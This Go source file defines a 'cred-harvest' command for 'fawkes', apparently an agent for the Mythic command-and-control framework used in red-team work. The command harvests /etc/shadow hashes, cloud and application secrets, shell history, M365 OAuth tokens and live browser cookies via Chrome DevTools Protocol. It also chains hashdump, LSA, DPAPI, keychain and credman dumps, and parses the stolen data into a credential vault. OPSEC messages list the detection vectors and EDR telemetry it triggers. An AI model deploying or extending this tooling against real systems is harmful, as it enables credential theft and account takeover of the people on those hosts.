package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name: "cred-harvest",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "credharvest_new.js"),
			Author:     "@galoryber",
		},
		Description:         "Harvest credentials from system files, cloud configs, application secrets, shell history, Windows sources, and M365 OAuth tokens",
		HelpString:          "cred-harvest -action <shadow|cloud|configs|history|windows|m365-tokens|browser-live|all> [-user <filter>]\nLinux/macOS: shadow, cloud, configs, history, browser-live, all\nWindows: cloud, configs, windows, m365-tokens, history, browser-live, all\nhistory: Scan shell history files for leaked passwords, tokens, and API keys\nm365-tokens: Extract OAuth/JWT tokens from TokenBroker, Teams, and Outlook\nbrowser-live: Steal live cookies, localStorage, sessionStorage via Chrome DevTools Protocol (CDP)",
		Version:             4,
		MitreAttackMappings: []string{"T1552.001", "T1552.003", "T1552.004", "T1003.008", "T1528", "T1539"},
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
				agentstructs.SUPPORTED_OS_WINDOWS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:      "shadow: system password hashes (Unix). cloud: cloud/infra credentials. configs: application secrets. history: scan shell history for leaked credentials. windows: PowerShell history, env vars, RDP, WiFi. m365-tokens: OAuth/JWT from TokenBroker, Teams, Outlook (Windows). browser-live: steal live cookies, localStorage, sessionStorage via Chrome DevTools Protocol (CDP). all: run all platform-appropriate actions. dump-all: automated chain — runs hashdump + lsa-secrets + cred-harvest all in parallel via subtasks (Windows).",
				Choices:          []string{"all", "shadow", "cloud", "configs", "history", "windows", "m365-tokens", "browser-live", "dump-all", "full-sweep"},
				DefaultValue:     "all",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 0},
				},
			},
			{
				Name:                 "user",
				ModalDisplayName:     "User Filter",
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				DynamicQueryFunction: getCallbackUserList,
				Description:          "Filter results by username (optional)",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 1},
				},
			},
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Credential harvesting completed. File access logs generated for /etc/shadow, cloud config files, shell history, and application secrets. EDR file-read telemetry may flag access to credential stores. Harvested credentials registered in Mythic vault — rotate compromised credentials after engagement.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			hostname := processResponse.TaskData.Callback.Host
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData

			// Parse shadow hashes: lines with user:$hash:rest
			if strings.Contains(responseText, "/etc/shadow") || strings.Contains(responseText, "Password Hashes") {
				for _, line := range strings.Split(responseText, "\n") {
					trimmed := strings.TrimSpace(line)
					if !strings.Contains(trimmed, ":$") {
						continue
					}
					parts := strings.SplitN(trimmed, ":", 3)
					if len(parts) < 2 || parts[0] == "" {
						continue
					}
					creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
						CredentialType: "hash",
						Realm:          hostname,
						Account:        parts[0],
						Credential:     parts[1],
						Comment:        "cred-harvest (shadow)",
					})
				}
			}

			// Parse browser-live CDP output: auth cookies and storage entries
			if strings.Contains(responseText, "Browser Live Session Theft (CDP)") {
				for _, line := range strings.Split(responseText, "\n") {
					trimmed := strings.TrimSpace(line)
					// Parse auth cookies: [AUTH] .domain.com: name = value (flags)
					if strings.HasPrefix(trimmed, "[AUTH]") {
						parts := strings.SplitN(trimmed[7:], ":", 2)
						if len(parts) == 2 {
							domain := strings.TrimSpace(parts[0])
							rest := strings.TrimSpace(parts[1])
							eqIdx := strings.Index(rest, " = ")
							if eqIdx > 0 {
								cookieName := strings.TrimSpace(rest[:eqIdx])
								cookieVal := rest[eqIdx+3:]
								// Trim flags suffix
								if parenIdx := strings.LastIndex(cookieVal, " ("); parenIdx > 0 {
									cookieVal = cookieVal[:parenIdx]
								}
								creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
									CredentialType: "plaintext",
									Realm:          strings.TrimPrefix(domain, "."),
									Account:        cookieName,
									Credential:     cookieVal,
									Comment:        "cred-harvest browser-live (cookie)",
								})
							}
						}
					}
					// Parse localStorage/sessionStorage: [LS] key = value or [SS] key = value
					if strings.HasPrefix(trimmed, "[LS]") || strings.HasPrefix(trimmed, "[SS]") {
						prefix := trimmed[:4]
						rest := strings.TrimSpace(trimmed[4:])
						eqIdx := strings.Index(rest, " = ")
						if eqIdx > 0 {
							key := strings.TrimSpace(rest[:eqIdx])
							val := rest[eqIdx+3:]
							source := "localStorage"
							if prefix == "[SS]" {
								source = "sessionStorage"
							}
							creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
								CredentialType: "plaintext",
								Realm:          hostname,
								Account:        key,
								Credential:     val,
								Comment:        fmt.Sprintf("cred-harvest browser-live (%s)", source),
							})
						}
					}
				}
			}

			// Parse sensitive env vars: lines like VARIABLE=value under "Sensitive Environment Variables"
			if strings.Contains(responseText, "Sensitive Environment Variables") {
				inEnvSection := false
				for _, line := range strings.Split(responseText, "\n") {
					if strings.Contains(line, "Sensitive Environment Variables") {
						inEnvSection = true
						continue
					}
					if inEnvSection && strings.HasPrefix(line, "===") {
						break
					}
					if !inEnvSection {
						continue
					}
					trimmed := strings.TrimSpace(line)
					if idx := strings.Index(trimmed, "="); idx > 0 {
						varName := trimmed[:idx]
						varValue := trimmed[idx+1:]
						if varValue != "" {
							creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
								CredentialType: "plaintext",
								Realm:          hostname,
								Account:        varName,
								Credential:     varValue,
								Comment:        "cred-harvest (env)",
							})
						}
					}
				}
			}

			registerCredentials(processResponse.TaskData.Task.ID, creds)
			return response
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			msg := fmt.Sprintf("OPSEC WARNING: Credential harvesting (action: %s). Accesses system files, cloud configs, shell history, and application secrets. File access patterns may trigger EDR behavioral alerts (T1552.001, T1552.003, T1552.004).", action)
			if action == "browser-live" {
				msg = "OPSEC WARNING: Browser Live Session Theft connects to Chrome/Edge via Chrome DevTools Protocol (CDP) on localhost debug ports. Detection vectors: (1) DevToolsActivePort file access in browser user data dirs, (2) TCP connections to localhost debug ports (9222-9229), (3) WebSocket upgrade requests to /devtools/ paths, (4) Network.getAllCookies and Runtime.evaluate CDP commands logged by browser internals. EDR products (CrowdStrike, SentinelOne) may flag debug port probing and CDP WebSocket connections as suspicious browser manipulation (T1539, T1555.003)."
			} else if action == "dump-all" {
				msg = "OPSEC WARNING: Credential Harvest Chain will execute hashdump + lsa-secrets + cred-harvest simultaneously. This triggers SAM/LSA access (requires SYSTEM), reads shadow hashes, cloud configs, and shell history. Combined footprint: memory access to LSASS/SAM, file reads across user profiles, and DPAPI decryption. High detection risk from multiple credential access techniques in rapid succession (T1003.002, T1003.004, T1003.005, T1552)."
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
			"dumpAllComplete":  credHarvestDumpAllComplete,
			"fullSweepComplete": credHarvestFullSweepComplete,
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}

			action, _ := taskData.Args.GetStringArg("action")
			user, _ := taskData.Args.GetStringArg("user")

			// dump-all: create parallel subtask group (hashdump + lsa-secrets dump + cred-harvest all)
			if action == "dump-all" {
				display := "Credential Harvest Chain (hashdump + lsa-secrets + cred-harvest)"
				response.DisplayParams = &display
				completionFunc := "dumpAllComplete"
				response.CompletionFunctionName = &completionFunc

				tasks := []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
					{CommandName: "hashdump", Params: "{}"},
					{CommandName: "lsa-secrets", Params: `{"action":"dump"}`},
					{CommandName: "cred-harvest", Params: `{"action":"all"}`},
				}

				groupResult, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(
					mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
						TaskID:                taskData.Task.ID,
						GroupName:             "credential_harvest_chain",
						GroupCallbackFunction: &completionFunc,
						Tasks:                 tasks,
					},
				)
				if err != nil || !groupResult.Success {
					errMsg := "Failed to create subtask group"
					if err != nil {
						errMsg = fmt.Sprintf("Failed to create subtask group: %s", err.Error())
					} else if groupResult != nil {
						errMsg = fmt.Sprintf("Failed to create subtask group: %s", groupResult.Error)
					}
					response.Success = false
					response.Error = errMsg
					return response
				}

				createArtifact(taskData.Task.ID, "Subtask Chain",
					"Credential Harvest Chain: hashdump + lsa-secrets + cred-harvest all (parallel)")
				return response
			}

			// full-sweep: exhaustive credential collection (cred-harvest all + browser + dpapi + ssh-keys + keychain + hashdump + lsa-secrets + credman)
			if action == "full-sweep" {
				display := "Full Credential Sweep (cred-harvest + browser + dpapi + ssh-keys + keychain + hashdump + lsa-secrets + credman)"
				response.DisplayParams = &display
				completionFunc := "fullSweepComplete"
				response.CompletionFunctionName = &completionFunc

				tasks := []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
					{CommandName: "cred-harvest", Params: `{"action":"all"}`},
					{CommandName: "cred-harvest", Params: `{"action":"browser-live"}`},
					{CommandName: "browser", Params: `{"action":"passwords"}`},
					{CommandName: "dpapi", Params: `{"action":"masterkeys"}`},
					{CommandName: "ssh-keys", Params: `{"action":"enumerate"}`},
					{CommandName: "keychain", Params: `{}`},
					{CommandName: "hashdump", Params: `{}`},
					{CommandName: "lsa-secrets", Params: `{"action":"dump"}`},
					{CommandName: "credman", Params: `{"action":"dump"}`},
				}

				groupResult, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(
					mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
						TaskID:                taskData.Task.ID,
						GroupName:             "credential_full_sweep",
						GroupCallbackFunction: &completionFunc,
						Tasks:                 tasks,
					},
				)
				if err != nil || !groupResult.Success {
					errMsg := "Failed to create full sweep subtask group"
					if err != nil {
						errMsg = fmt.Sprintf("Failed to create subtask group: %s", err.Error())
					} else if groupResult != nil {
						errMsg = fmt.Sprintf("Failed to create subtask group: %s", groupResult.Error)
					}
					response.Success = false
					response.Error = errMsg
					return response
				}

				createArtifact(taskData.Task.ID, "Subtask Chain",
					"Full Credential Sweep: cred-harvest + browser-live + browser + dpapi + ssh-keys + keychain (parallel)")
				return response
			}

			displayParams := action
			if user != "" {
				displayParams += " (user: " + user + ")"
			}
			response.DisplayParams = &displayParams

			if action == "browser-live" {
				createArtifact(taskData.Task.ID, "Network Connection", "CDP WebSocket connection to localhost debug port (Chrome DevTools Protocol)")
				createArtifact(taskData.Task.ID, "File Read", "DevToolsActivePort (browser user data directory)")
			}
			if action == "shadow" || action == "all" {
				createArtifact(taskData.Task.ID, "File Read", "/etc/shadow")
			}
			if action == "history" || action == "all" {
				createArtifact(taskData.Task.ID, "File Read", "~/.bash_history, ~/.zsh_history, ~/.local/share/fish/fish_history")
			}
			if action == "m365-tokens" || action == "all" {
				createArtifact(taskData.Task.ID, "File Read", "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres")
				createArtifact(taskData.Task.ID, "API Call", "CryptUnprotectData (DPAPI)")
			}

			return response
		},
	})
}
